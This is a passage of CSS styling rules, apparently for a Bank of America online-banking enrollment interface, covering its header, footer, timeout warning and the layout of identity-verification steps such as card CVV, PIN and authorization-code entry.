        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options .list-item.active .list-item-content {
            font-family: "cnx-bold", Arial, Helvetica, sans-serif
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options .list-item.inactive .bullet {
            color: #8D8B89;
            border-color: #D4D2CE;
            border-width: 1px;
            font-family: "cnx-light", Arial, Helvetica, sans-serif
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options .list-item.done .bullet {
            background-color: #00ad50;
            color: #00ad50;
            position: relative
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .list-options .list-item.done .bullet:before {
            content: "";
            display: inline-block;
            height: 10px;
            width: 16px;
            border: 4px solid white;
            border-top-width: 0;
            border-right-width: 0;
            -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg);
            background: transparent none repeat scroll 0 0;
            position: absolute;
            left: 4px;
            top: 4px
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .invisible {
            visibility: hidden
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .mt-20 {
            margin-top: 20px !important
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .mt-25 {
            margin-top: 25px !important
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .mt-30 {
            margin-top: 30px !important
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .pleft-10 {
            padding-left: 10px
        }

        @media only screen and (max-width: 480px) {
            [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .bg-grey {
                background-color: #F2F2F2
            }
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .mb-20 {
            margin-bottom: 20px !important
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .pb-20 {
            padding-bottom: 20px !important
        }

        [data-sparta-container] .ah-ecd-sa-module #ah-ecdsa-module-container .ml-20 {
            margin-left: 20px
        }

        [data-sparta-container] .ah-ecd-sa-module .hidden {
            display: none !important
        }

        [data-sparta-container] .ah-ecd-sa-module .ft-header--2 {
            font: 18px "cnx-regular", Arial, Helvetica, sans-serif;
            color: #012169;
            line-height: 120%
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-ecd-sa-module .ft-header--2 {
                font-size: 22px
            }
        }

        [data-sparta-container] .ah-ecd-sa-module .ft-content--1 {
            font: 14px Arial, Helvetica, sans-serif;
            line-height: 140%;
            color: #595959
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-ecd-sa-module .ft-content--1 {
                font-size: 16px
            }
        }

        [data-sparta-container] .ah-ecd-sa-module .ft-content--1C {
            font: 14px "cnx-regular", Arial, Helvetica, sans-serif;
            line-height: 140%;
            color: #595959
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-ecd-sa-module .ft-content--1C {
                font-size: 14px
            }
        }

        [data-sparta-container] .ah-ecd-sa-module .ft-header--2b {
            font: 14px Arial, Helvetica, sans-serif;
            font-weight: bold;
            color: #333;
            line-height: 140%
        }

        [data-sparta-container] .ah-ecd-sa-module .ft-link {
            font: 16px "cnx-regular", Arial, Helvetica, sans-serif;
            color: #0052c2
        }

        [data-sparta-container] .ah-ecd-sa-module .ft-content--3 {
            font: 18px "cnx-light", Arial, Helvetica, sans-serif;
            color: #000;
            line-height: 23px
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-ecd-sa-module .ft-content--3 {
                font-size: 18px
            }
        }

        [data-sparta-container] .ah-ecd-sa-module .ft-content--4 {
            font: 16px "cnx-regular", Arial, Helvetica, sans-serif;
            color: #000;
            line-height: 19px
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-ecd-sa-module .ft-content--4 {
                font-size: 16px
            }
        }

        .ah-footer-module-class-v-2-3-1 {
            font: 100% Arial, Helvetica, sans-serif;
            color: #333
        }

        .ah-footer-module-class-v-2-3-1 .no-padding {
            padding: 0
        }

        .ah-footer-module-class-v-2-3-1 .fl-lt {
            float: left
        }

        .ah-footer-module-class-v-2-3-1 .f-icon {
            padding-left: 10px
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer {
            bottom: 0
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer #secondaryFooter {
            margin: 0 auto;
            text-align: center
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .footer-inner {
            padding: 2% 3% 3% 3%;
            background-color: #f3efea
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .footer-inner .bofa-copyright p {
            margin-bottom: 0
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .block {
            display: block
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .f-small {
            font-size: 11px;
            color: #666;
            font-weight: bold;
            line-height: 14px;
            padding-left: 10px
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .f-base {
            font-size: 11px;
            line-height: 15px
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .f-base-secondary {
            font-size: 15px;
            line-height: 15px
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .f-copyright {
            font-size: 11px;
            line-height: 15px;
            color: #333
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .f-copyright-secondary {
            font-size: 15px;
            line-height: 15px;
            color: #333
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .mb-15 {
            margin-bottom: 15px
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .mb-10 {
            margin-bottom: 15px
        }

        .ah-footer-module-class-v-2-3-1 #ahFooterContainer .mt-10 {
            margin-top: 10px
        }

        #timeoutWarningContent p {
            margin-bottom: 1.25rem
        }

        #timeoutWarningContent p:first-of-type {
            margin-top: 1.25rem;
            font-weight: bold
        }

        @media only screen and (min-width: 768px) {
            #timeoutWarningContent p:first-of-type {
                margin-top: 0
            }
        }

        @media only screen and (min-width: 768px) {
            #timeoutWarningContent .modalLayer div {
                float: left
            }

            #timeoutWarningContent .modalLayer .logo {
                width: 2.5rem;
                padding-top: 0.4rem
            }

            #timeoutWarningContent .modalLayer .warningContent {
                width: 30rem;
                margin-left: 1.25rem
            }

            #timeoutWarningContent .modalLayer .button {
                margin-left: 3.8rem
            }
        }

        #timeoutWarningContent #logoutTimerStyle {
            font-weight: bold;
            margin-bottom: 1.25rem;
            display: none
        }

        html {
            overflow-y: scroll
        }

        .left {
            float: left
        }

        .right {
            float: right
        }

        .clearfix:after,
        .clearfix:before {
            content: " ";
            display: table
        }

        .clearfix:after {
            clear: both
        }

        img#bacLogo {
            display: none;
            height: 27px
        }

        @media only screen and (min-width: 768px) {
            img#bacLogo {
                display: block
            }
        }

        img#atpbacLogo {
            margin-top: 5px;
            display: block;
            height: 18px
        }

        @media only screen and (min-width: 768px) {
            img#atpbacLogo {
                height: 27px
            }
        }

        img#atpbacLogoSmall {
            display: block;
            height: 100px;
            position: relative;
            bottom: 30px;
            right: 50px;
            margin-top: 0
        }

        @media only screen and (min-width: 320px) {
            img#atpbacLogoSmall {
                display: none
            }
        }

        img#bacLogoSmall {
            display: block;
            height: 100px;
            position: relative;
            bottom: 30px;
            right: 50px;
            margin-top: 0
        }

        @media only screen and (min-width: 768px) {
            img#bacLogoSmall {
                display: none
            }
        }

        #ahHeaderContainer .spa-page-header-grid-container {
            height: 25px !important
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 {
            font: 100% "cnx-regular", Arial, Helvetica, sans-serif;
            color: #333;
            padding: 10px 0
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 {
                padding: 25px 0
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .bofa-logo {
            display: inline-block;
            vertical-align: middle;
            overflow: hidden;
            float: left;
            width: 280px
        }

        @media only screen and (max-width: 40em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .bofa-logo {
                width: 186px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .bofa-logo-small {
            display: inline-block;
            vertical-align: middle;
            overflow: hidden;
            float: left
        }

        @media only screen and (max-width: 40em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .f-base.header-title {
                font-size: 14px;
                margin-left: 0
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .columns.collapse {
            padding-left: 0;
            padding-right: 0
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .f-base {
            font-size: 20px;
            color: #837361
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .mt-5 {
            margin-top: 5px
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .ml-25 {
            margin-left: 25px
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 h2 {
            float: left;
            color: #837361;
            font: 20px Arial, Helvetica, sans-serif;
            margin: 5px 0 0 25px
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-grid-container {
            height: 40px;
            position: relative;
            bottom: 4px
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-container {
            position: relative;
            z-index: 1000;
            background-color: #fff;
            border-bottom: none
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-container.border-show {
            border-bottom: 1px solid #d1c9c0
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-container .nav-tab-arrow {
            display: none;
            position: absolute;
            top: 38px;
            right: 30px
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-container .nav-tab-arrow {
                top: 68px
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-container .nav-tab-arrow {
                top: 68px;
                right: 41px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-container .nav-tab-arrow.show {
            display: inline-block
        }

        @media (max-width: 767px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-container .nav-search {
                display: none !important
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-tagline-wrapper {
            margin-top: 10px;
            margin-left: 60px;
            font-size: 14px
        }

        @media (max-width: 767px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-tagline-wrapper {
                display: none
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-tagline-wrapper.invisible {
            visibility: hidden;
            position: absolute
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-tagline-wrapper.small {
            font-size: 12px;
            margin-top: 8px
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-brand {
            padding: 12px 0
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-brand {
                padding: 22.5px 0
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-brand {
                padding: 22.5px 0
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-brand-product {
            margin: 2px 0 0 210px;
            color: #6b5e51;
            font-size: 14px
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-brand-product {
                margin: 6px 0 0 210px;
                font-size: 18px
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-brand-product {
                margin: 6px 0 0 215px
            }
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-right {
                margin-right: -5px
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-right {
                margin-top: 23px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu {
            display: inline-block;
            position: relative;
            bottom: 3px;
            vertical-align: bottom;
            height: 30px;
            width: 70px
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu .ancShowHideRelatedLinks {
                margin: -8px 0 0;
                padding: 3px;
                height: 35px;
                width: 75px
            }
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu {
                bottom: -8px
            }
        }

        @media only screen and (min-width: 768px) and (max-width: 1024px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu {
                bottom: -1px;
                margin-left: 13px;
                margin-right: -9px;
                width: 90px
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu {
                bottom: -1px;
                width: 115px;
                margin-right: -20px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a {
            display: block;
            padding-left: 5px;
            width: 70px;
            height: 30px;
            font-family: cnx-medium, sans-serif;
            font-size: 14px;
            color: #6b5e51;
            cursor: pointer
        }

        @media (max-width: 767px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a {
                margin-top: 12px;
                padding-left: 2px
            }
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a {
                font-size: 18px;
                font-family: cnx-medium, sans-serif
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a {
                margin-left: 6px;
                width: 82px;
                height: 30px;
                font-size: 18px
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a {
                margin-left: 15px;
                font-size: 18px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a:focus,
        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a:hover {
            color: #191613;
            cursor: pointer
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a:focus #downArrow,
        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a:hover #downArrow {
            stroke: #000
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a:focus {
            background-color: #f2f2f2
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-content {
            position: absolute;
            top: 17px;
            right: 28px
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-content {
                top: 0;
                right: 21px
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-content {
                top: 5px;
                right: 35px
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-content {
                top: 5px;
                right: 48px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-arrow-icon {
            position: absolute;
            top: 21px;
            right: 2px;
            width: 20px;
            height: 12px
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-arrow-icon {
                top: 5px;
                right: -5px
            }
        }

        @media only screen and (min-width: 768px) and (max-width: 1024px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-arrow-icon {
                top: 10px;
                right: 9px
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-arrow-icon {
                top: 10px;
                right: 22px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-arrow-icon.arrow-rotate-up {
            -webkit-animation-duration: 0.5s;
            animation-duration: 0.5s;
            -webkit-animation-name: arrowrotateup;
            animation-name: arrowrotateup;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-transform-origin: center;
            transform-origin: center
        }

        @-webkit-keyframes arrowrotateup {
            from {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }

            to {
                -webkit-transform: rotate(-180deg);
                transform: rotate(-180deg)
            }
        }

        @keyframes arrowrotateup {
            from {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }

            to {
                -webkit-transform: rotate(-180deg);
                transform: rotate(-180deg)
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-arrow-icon.arrow-rotate-down {
            -webkit-animation-duration: 0.5s;
            animation-duration: 0.5s;
            -webkit-animation-name: arrowrotatedown;
            animation-name: arrowrotatedown;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-transform-origin: center;
            transform-origin: center
        }

        @-webkit-keyframes arrowrotatedown {
            from {
                -webkit-transform: rotate(-180deg);
                transform: rotate(-180deg)
            }

            to {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }
        }

        @keyframes arrowrotatedown {
            from {
                -webkit-transform: rotate(-180deg);
                transform: rotate(-180deg)
            }

            to {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg)
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-menu a span.related-links-arrow-icon svg#downArrow {
            position: absolute
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .atp-header-secure {
            display: inline-block;
            position: relative;
            top: 1px;
            vertical-align: middle
        }

        @media only screen and (min-width: 320px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .atp-header-secure {
                top: -20px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .atp-header-secure a {
            color: #524940;
            display: inline-block;
            overflow: hidden;
            white-space: nowrap
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .atp-header-secure .lock-icon {
            margin-left: 6px;
            padding-left: 18px;
            position: relative
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .atp-header-secure .lock-icon {
                margin-left: 24px
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .atp-header-secure .lock-icon {
                margin-left: 22px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .atp-header-secure .lock-icon::before {
            display: block;
            height: 12px;
            left: 0;
            position: absolute;
            top: 1px;
            width: 12px;
            content: ""
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-secure {
            display: inline-block;
            position: relative;
            top: 1px;
            vertical-align: middle
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-secure a {
            color: #524940;
            display: inline-block;
            overflow: hidden;
            white-space: nowrap
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-secure .lock-icon {
            margin-left: 6px;
            padding-left: 18px;
            position: relative
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-secure .lock-icon {
                margin-left: 24px
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-secure .lock-icon {
                margin-left: 22px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header .header-secure .lock-icon::before {
            display: block;
            height: 12px;
            left: 0;
            position: absolute;
            top: 1px;
            width: 12px;
            content: ""
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links {
            display: inline-block;
            margin: 10px -17px 0 0;
            list-style-type: none;
            font-size: 14px;
            vertical-align: -webkit-baseline-middle;
            text-decoration: none;
            color: #0052C2
        }

        @media (max-width: 767px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links {
                position: relative;
                margin: 5px -17px 0 0
            }
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links {
                position: static;
                font-size: 14px;
                margin: 10px -9px 0 0
            }
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links {
                font-size: 12px;
                margin: -18px 0 0
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links {
                margin: -18px -8px 0 0
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link {
            display: inline-block;
            margin: 0 20px
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up {
            display: none;
            margin-right: 10px
        }

        @media (min-width: 40.063em) and (max-width: 47.938em) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up {
                display: inline-block;
                margin-right: 23px
            }
        }

        @media only screen and (min-width: 1025px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up {
                display: inline-block
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up a {
            color: #0052C2
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up a:focus,
        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up a:hover {
            color: #012169
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up a:visited {
            color: #0052C2
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up a:visited:focus {
            color: #012169
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link.show-for-smallish-and-large-up {
                margin-right: 22px
            }
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link a {
            color: #0052C2
        }

        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link a:focus,
        [data-sparta-container] .ah-header-module-class-v-3-3-0 .spa-page-header-links .spa-page-header-link a:hover {
            color: #012169
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 {
            font: 100% "cnx-regular";
            color: #000
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 h3 {
            font: 100% "cnx-bold", Arial, Helvetica, sans-serif;
            font-size: 20px
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 p {
            color: #000;
            font-size: 17px
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 .mb-15 {
            margin-bottom: 15px
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 .mt-20 {
            margin-top: 20px
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 .mb-20 {
            margin-bottom: 20px
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 .mb-30 {
            margin-bottom: 30px
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 .mb-40 {
            margin-bottom: 40px
        }

        [data-sparta-container] .ah-enroll-email-module-class-v-1-1-0 .mtop-40 {
            margin-top: 40px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 {
            font: "cnx-regular";
            color: #000
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mtop-10 {
            margin-top: 10px !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mtop-20 {
            margin-top: 20px !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mtop-30 {
            margin-top: 30px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mtop-40 {
            margin-top: 40px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mbottom-10 {
            margin-bottom: 10px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mbottom-20 {
            margin-bottom: 20px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mbottom-30 {
            margin-bottom: 30px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mbottom-40 {
            margin-bottom: 40px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .mleft-15 {
            margin-left: 15px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .ptop-30 {
            padding-top: 30px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .acct-height {
            margin-top: 30px
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .acct-height {
                margin-top: 40px
            }
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #global-auth-error .spartaMessage-content {
            padding-top: 22px !important;
            padding-bottom: 22px !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .hidden {
            display: none
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 .home-btn-wrapper {
            text-align: center;
            margin-top: -55px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #no-ssn-dom {
            margin-bottom: 7%
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-dc-pin-container .atvo-label {
            font: 1em "cnx-medium";
            color: #000;
            font-weight: normal
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-dc-pin-container .atvo-card-number {
            border: none !important;
            font: 1em "cnx-regular";
            color: #000 !important;
            padding: 0 !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-dc-pin-container .visa-cvv-wrapper,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-dc-pin-container .amex-cvv-wrapper {
            width: 50%
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-dc-pin-container .visa-cvv-wrapper .cc-img,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-dc-pin-container .amex-cvv-wrapper .cc-img {
            width: 90%
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-cc-cvv-container .atvo-label {
            font: 1em "cnx-medium";
            color: #000;
            font-weight: normal;
            display: block
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-cc-cvv-container .atvo-card-number {
            border: none !important;
            font: 1em "cnx-regular";
            color: #000 !important;
            padding: 0 !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-cc-cvv-container .visa-cvv-wrapper,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-cc-cvv-container .amex-cvv-wrapper {
            width: 50%
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-cc-cvv-container .visa-cvv-wrapper .cc-img,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-cc-cvv-container .amex-cvv-wrapper .cc-img {
            width: 90%
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #requestAuthStep,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #enterAuthStep {
            padding: 30px 5px 0
        }

        @media only screen and (min-width: 768px) {

            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #requestAuthStep,
            [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #enterAuthStep {
                padding: 30px 5px 0
            }
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .step-header {
            font: 1.25em "cnx-bold" !important;
            color: #000 !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .authcode-caw {
            font: 1em "cnx-regular";
            color: #000;
            font-weight: normal
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #show-email-contacts,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container #request-another-code,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .js-show-nocontacts,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .js-emailcontext,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .ft-link {
            font: 1em "cnx-regular";
            font-weight: normal
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .disclaimer-main,
        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .disclaimer-sub {
            font-family: "cnx-regular";
            color: #000
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .action-buttons {
            margin-bottom: 40px
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container .action-buttons button {
            font-size: 1em;
            text-transform: capitalize !important
        }

        [data-sparta-container] .ah-enroll-main-module-class-v-1-2-0 #ah-authcode-container input[type="text"],
